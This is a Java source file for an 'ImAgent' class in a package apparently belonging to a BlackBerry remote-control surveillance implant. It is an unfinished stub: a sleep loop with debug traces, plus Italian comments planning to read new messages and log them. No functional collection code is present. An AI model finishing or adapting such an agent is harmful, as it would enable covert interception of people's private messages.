package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ImAgent extends Agent {
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);

    private int timeToSleep = 1000;

    public ImAgent(int agentStatus) {
        super(Agent.AGENT_IM, agentStatus, true);
    }

    protected ImAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");

        int loop = 0;

        for (;;) {
            debug.trace("loop:" + loop);
            ++loop;

            // verifica che ci siano email *nuove* da leggere

            // per ogni email da leggere

            // genera un log con la email

            if (agentSleep(timeToSleep)) {
                debug.trace(loop + " clean stop");
                return;
            }
        }
    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}